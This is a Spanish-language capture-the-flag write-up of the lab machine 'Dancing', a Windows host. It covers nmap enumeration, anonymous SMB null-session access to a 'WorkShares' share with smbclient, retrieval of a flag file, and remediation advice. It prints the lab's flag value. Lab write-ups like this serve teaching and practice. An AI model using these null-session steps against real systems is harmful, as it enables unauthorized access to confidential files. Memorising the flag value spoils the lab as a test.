---
categories:
  - "[[Ciber]]"
tags:
  - vms
  - pentesting
  - starting-point
created: 2026-02-15
---
## 1. Información General

- **Máquina:** Dancing

- **IP:** 10.129.9.24

- **SO:** Windows

- **Dificultad:** Muy facil

- **Fecha:** 15/02/2026
    

## 2. Resumen Ejecutivo

Se comprometió el servidor Windows explotando una configuración insegura en el servicio SMB (Null Session). Esta brecha permitió el acceso de red anónimo y no autenticado a un recurso compartido interno (`WorkShares`), derivando en la exposición y extracción no autorizada de información confidencial de los usuarios.

## 3. Enumeración (Reconocimiento)

### 3.1 Escaneo de Red

- **Comando utilizado:** `nmap -sC -sV 10.129.9.24`
    
- **Puertos Abiertos:**
    

| **Puerto** | **Servicio**  | **Versión**                   | **Estado** |
| ---------- | ------------- | ----------------------------- | ---------- |
| 135        | msrpc         | Windows RPC                   | Abierto    |
| 139        | netbios-ssn   | Windows netbios-ssn           | Abierto    |
| 445        | microsotf-ds? | SMB                           | Abierto    |
| 5985       | http          | HTTPAPI httpd 2.0 (SSDP/UPnP) | Abierto    |

### 3.2 Análisis de Servicios

- **Tecnologías Detectadas:** Microsoft Windows SMB (Puertos 139, 445), WinRM/HTTPAPI 2.0 (Puerto 5985), RPC (Puerto 135)

- **Hallazgos Clave:** El script `smb2-security-mode` de Nmap revela que la versión del protocolo es SMB 3.1.1 y que la firma de mensajes está habilitada pero no es requerida. 2. Mediante enumeración de recursos compartidos (`smbclient -L`), se descubrió un recurso no estándar llamado `WorkShares` accesible de forma anónima (Null Session) sin requerir credenciales válidas.
    

## 4. Análisis de Vulnerabilidades

- **Vulnerabilidad Principal:** Acceso anónimo no autenticado a recursos compartidos SMB (SMB Null Session / Guest Access)

- **Referencia:** Mitre ATT&CK T1021.002 (SMB/Windows Admin Shares)
    

## 5. Explotación (Gaining Access)

- **Razonamiento:** Aprovechar la mala configuración de permisos en el recurso compartido `WorkShares` para acceder directamente al sistema de archivos mediante una sesión nula.
    
- **Pasos de Reproducción:**
    
    1. Iniciar conexión al recurso compartido forzando un inicio de sesión en blanco (pulsando Enter al pedir contraseña): `smbclient //10.129.9.24/WorkShares`
        
    2. - Navegar por los directorios internos de los usuarios expuestos: `ls` -> `cd James.P`
    
	3. Descargar el archivo confidencial encontrado: `get flag.txt`
        
- **Evidencia:**
    
    ┌──(julicc㉿diavlo)-[~]
	└─$ smbclient //10.129.9.24/WorkShares
	Password for WORKGROUP\julicc:
	Try "help" to get a list of possible commands.
	smb: \> help
	smb: \> ls James.P\
  .                                   D        0  Thu Jun  3 10:38:03 2021
  ..                                  D        0  Thu Jun  3 10:38:03 2021
  flag.txt                            A       32  Mon Mar 29 11:26:57 2021

		5114111 blocks of size 4096. 1750444 blocks available
	smb: \> get James.P\flag.txt 
	getting file \James.P\flag.txt of size 32 as James.P\flag.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
	smb: \> exit
	                                                                                          
	┌──(julicc㉿diavlo)-[~]
	└─$ cat flag.txt 
	035db21c881520061c53e0536e44f815
	

## 6. Post-Explotación (Escalada de Privilegios)
    
- **Prueba de Compromiso (Flags):**
        
    - 🚩 **Root Flag:** `035db21c881520061c53e0536e44f815`

## 7. Remediación y Conclusiones

- **Criticidad:** Alta
    
- **Recomendaciones:**
    
    1. - **Control de Acceso:** Deshabilitar las sesiones nulas (Null Sessions) y el acceso a la cuenta "Invitado" (Guest) en la configuración de directivas locales de Windows Server.
    
	2. **Permisos NTFS y de Recurso Compartido:** Asegurar que el recurso `WorkShares` tenga permisos explícitos de lectura/escritura únicamente para los grupos de usuarios de dominio autorizados (ej. `Domain Users`), eliminando al grupo `Todos` (Everyone).